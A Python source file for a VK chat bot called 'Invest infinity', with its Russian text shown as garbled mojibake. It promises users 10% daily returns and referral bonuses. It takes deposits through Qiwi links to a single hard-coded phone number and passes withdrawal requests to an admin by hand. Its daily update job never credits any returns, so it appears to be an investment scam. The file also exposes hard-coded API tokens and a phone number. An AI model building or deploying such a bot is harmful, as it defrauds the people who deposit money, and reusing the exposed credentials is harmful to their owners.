import json
from time import sleep
from random import randint as r
import requests
from vkbottle.bot import Bot, Message
from vkbottle import Keyboard, KeyboardButtonColor, Text
import schedule
from threading import Thread
bot = Bot(token='687742c312f7366ead0d96a0b2a2474950b6c6b97fa88cc8be8c0293093f8fceb1f5411d4f6a9a5baf5da')
qiwi_token = "27ead4bbc09c4e46edd8a695831602ce"
def schedule_checker():
    while True:
        schedule.run_pending()
        sleep(1)

def update_money():
    import json
    with open('base.json', 'r') as f:
        templates = json.load(f)
        f.close()
    for i in templates["users"]:
        for j in range(len(list(i.values()))):
            print(list(i.values())[j][1])
        break
    with open("base.json", 'w') as f:
        json.dump(templates, f)
        f.close()
schedule.every().day.at("00:00").do(update_money)
@bot.on.message(text='–Ω–∞—á–∞—Ç—å')
async def main(message: Message):
    with open('base.json', 'r') as f:
        templates = json.load(f)
        f.close()
    ref = str(message).split()
    ind = ref[22]
    ind = ind.split('=')
    ind = ind[1]
    user_info = await bot.api.users.get(message.from_id)
    id = str(user_info[0]).split()
    id = id[4].split('=')
    id = id[1]
    need = templates.values()

    for i in need:
        ned = i[0]
        inv = i[1]
        break
    if id not in ned.keys():
        for i in templates.values():
            for i in need:
                i[1] += 1
            ind = ind[1:-1]

            try:
                ned[ind][3] += 1
                ned[ind][0] += 3
            except:
                pass
            ned[id] = [0, 0, ind, 0, 'Start', -1,'']
        with open("base.json", 'w') as f:
            json.dump(templates, f)
            f.close()

    await message.answer(
        "–ü—Ä–∏–≤–µ—Ç!\n\n –¢—ã –ø–æ–ø–∞–ª –≤ Invest infinityüî•\n\n –£ –Ω–∞—Å —Ç—ã —Å–º–æ–∂–µ—à—å –∑–∞—Ä–∞–±–æ—Ç–∞—Ç—å –±–µ–∑ –≤–ª–æ–∂–µ–Ω–∏–π üíµ\n\n Telegram https://vk.cc/cdqlAe —Å –Ω–æ–≤–æ—Å—Ç—è–º–∏, –ø–æ–¥–ø–∏—à–∏—Å—å üòâ")
    await message.answer(
        message=("–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç –º–µ–Ω—é"),
        keyboard=(
            Keyboard(one_time=False, inline=False)
                .add(Text('üî•–ò–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å'), color=KeyboardButtonColor.POSITIVE)
                .add(Text('–ü—Ä–æ—Ñ–∏–ª—å'), color=KeyboardButtonColor.POSITIVE)
                .row()
                .add(Text('–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å'), color=KeyboardButtonColor.PRIMARY)
                .add(Text('–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤'), color=KeyboardButtonColor.PRIMARY)
        )
    )


@bot.on.message(text='üî•–ò–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å')
async def invest(message: Message):
    with open('base.json', 'r') as f:
        templates = json.load(f)
        f.close()
    user_info = await bot.api.users.get(message.from_id)
    id = str(user_info[0]).split()
    id = id[4].split('=')
    id = id[1]
    for i in templates.values():
        ned = i[0]
        ned[id][4] = 'Invest'
    for i in templates.values():
        ned = i[0]
        balance = ned[id][0]
        invested = ned[id][1]
    with open('base.json', 'w') as f:
        json.dump(templates, f)
        f.close()

    await message.answer(
        f"üíµ –í—ã –º–æ–∂–µ—Ç–µ –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å: {str(balance)}‚ÇΩ\nüíµ –ë–∞–ª–∞–Ω—Å –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–π: {str(invested)}‚ÇΩ\n\nüëâ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è:")


@bot.on.message(text="–ü—Ä–æ—Ñ–∏–ª—å")
async def profile(message: Message):
    with open('base.json', 'r') as f:
        templates = json.load(f)
        f.close()
    user_info = await bot.api.users.get(message.from_id)
    id = str(user_info[0]).split()
    id = id[4].split('=')
    id = id[1]
    for i in templates.values():
        investors = i[1]
        ned = i[0]
        ned[id][4] = 'Invest'
        balance = ned[id][0]
        invested = ned[id][1]
        refs = ned[id][3]
        znach = ned[id][5]
    if balance + invested < 15:
        check = "0.00"
    else:
        check = balance + invested
    ref_link = f'https://vk.com/write-212897234?ref={id}'

    comment_need = f'{id}-{str(int(znach) + 1)}'
    s = requests.Session()
    s.headers['authorization'] = 'Bearer ' + qiwi_token
    s.headers['Accept'] = "application/json"
    parameters = {'rows': 50, 'operation': "IN"}
    h = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + "79772824069 " + '/payments', params=parameters)

    reply = h.json()["data"]
    for transaction in reply:
        if transaction["comment"] == comment_need:
            if transaction["status"] == 'SUCCESS':
                for i in templates.values():
                    ned = i[0]
                    ned[id][0] += int(transaction["sum"]["amount"])
                    ned[id][5] += 1
                with open('base.json', 'w') as f:
                    json.dump(templates, f)
                    f.close()

    await message.answer(
        f"üíµ–í–∞—à –±–∞–ª–∞–Ω—Å: {balance}‚ÇΩ\nüíµ–î–æ—Ö–æ–¥ –≤ —Å—É—Ç–∫–∏: {invested * 0.1}‚ÇΩ\nüíµ–ò–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–æ: {invested}‚ÇΩ\nüíµ–ë–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞: {check}‚ÇΩ\n\nüë§–ò–Ω–≤–µ—Å—Ç–æ—Ä–æ–≤: {investors} —á–µ–ª–æ–≤–µ–∫\nüî•–°—Ç–∞—Ç—É—Å: –ò–≥—Ä–æ–∫\n\nüó£–ü–ª–∞—Ç–∏–º –∑–∞ —Ä–µ—Ñ–µ—Ä–∞–ª–∞ - 3‚ÇΩ\n\nüó£–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤:{refs} —á–µ–ª–æ–≤–µ–∫\n\nüó£–í–∞—à–∞ —Ä–µ—Ñ.—Å—Å—ã–ª–∫–∞:{ref_link} ")


@bot.on.message(text="–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å")
async def donate(message: Message):
    user_info = await bot.api.users.get(message.from_id)
    id = str(user_info[0]).split()
    id = id[4].split('=')
    id = id[1]
    with open('base.json', 'r') as f:
        templates = json.load(f)
        f.close()
    for i in templates.values():
        ned = i[0]
        ned[id][4] = 'Donate'
    with open('base.json', 'w') as f:
        json.dump(templates, f)
        f.close()
    await message.answer("–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è")

@bot.on.message(text="–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤")
async def withdraw(message: Message):
    user_info = await bot.api.users.get(message.from_id)
    id = str(user_info[0]).split()
    id = id[4].split('=')
    id = id[1]
    with open('base.json', 'r') as f:
        templates = json.load(f)
        f.close()
    for i in templates.values():
        ned = i[0]
        ned[id][4] = 'Withdraw'
    with open('base.json', 'w') as f:
        json.dump(templates, f)
        f.close()
    await message.answer("–í–Ω–∏–º–∞–Ω–∏–µ! –í—ã–≤–æ–¥ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Ç–æ–ª—å–∫–æ –Ω–∞ –ø–ª–∞—Ç–µ–∂–Ω—É—é —Å–∏—Å—Ç–µ–º—É Qiwi\n–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (7xxxxxxxxxx)")


@bot.on.message()
async def check_sums(message: Message):
    try:
        a = int(message.text)
    except:
        return 0
    with open('base.json', 'r') as f:
        templates = json.load(f)
        f.close()
    user_info = await bot.api.users.get(message.from_id)
    id = str(user_info[0]).split()
    id = id[4].split('=')
    id = id[1]
    for i in templates.values():
        ned = i[0]
        balance = ned[id][0]
        invested = ned[id][1]
        check = ned[id][4]
        znach = ned[id][5]
        znach = str(int(znach)+1)
    if check == 'Donate':
        Qiwi_phone = "79772824069"
        kop = "00"
        comment = f'{id}-{znach}'
        url = f"https://qiwi.com/payment/form/99?extra%5B%27account%27%5D={Qiwi_phone}&amountInteger={a}&" \
              f"amountFraction={kop}&extra%5B%27comment%27%5D={comment}&currency=643&blocked[0]=account&blocked[1]=comment&blocked[2]=sum&extra%5B%27accountType%27%5D=nickname"
        await message.answer(url)
    elif check == "Withdraw":
        for i in templates.values():
            ned = i[0]
            ned[id][6] = message.text
            ned[id][4] = "final_withdraw"
        with open('base.json', 'w') as f:
            json.dump(templates, f)
            f.close()
        await message.answer("–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞")
    elif check == "final_withdraw":
        if float(message.text) > balance:
            await message.answer(f"–û—à–∏–±–∫–∞! –ù–∞ –≤–∞—à–µ–º —Å—á–µ—Ç—É –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤. –£ –≤–∞—Å {invested} —Ä—É–±–ª–µ–π")
            return 0
        elif float(message.text) < 15:
            await message.answer("–û—à–∏–±–∫–∞! –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞ - 15 —Ä—É–±–ª–µ–π")
            return 0
        for i in templates.values():
            ned = i[0]
            tel = ned[id][6]
            ned[id][1]-=int(message.text)
            ned[id][4]=''
        await message.answer("–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞. –û–∂–∏–¥–∞–π—Ç–µ")
        await bot.api.messages.send(
            peer_id=521775887,
            random_id=int(r(1,10**10)),

            message=f"–¢–µ–ª:{tel}\n–°—É–º–º–∞:{message.text}"
        )
        with open('base.json', 'w') as f:
            json.dump(templates, f)
            f.close()
        return 0
    elif check == "Invest":

        if float(message.text) > balance:
            await message.answer("–û—à–∏–±–∫–∞, –Ω–∞ –≤–∞—à–µ–º —Å—á–µ—Ç—É –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤")
            return 0
        elif float(message.text) < 15:
            await message.answer("–û—à–∏–±–∫–∞, –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–π —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç 15 —Ä—É–±–ª–µ–π")
            return 0
        else:
            ned[id][0] -= float(message.text)
            ned[id][1] += float(message.text)
            ned[id][4] = ''
            await message.answer("–£—Å–ø–µ—à–Ω–æ!")
            with open('base.json', 'w') as f:
                json.dump(templates, f)
                f.close()


if __name__ == "__main__":
    scheduleThread = Thread(target=schedule_checker)
    scheduleThread.daemon = True
    scheduleThread.start()
    bot.run_forever()
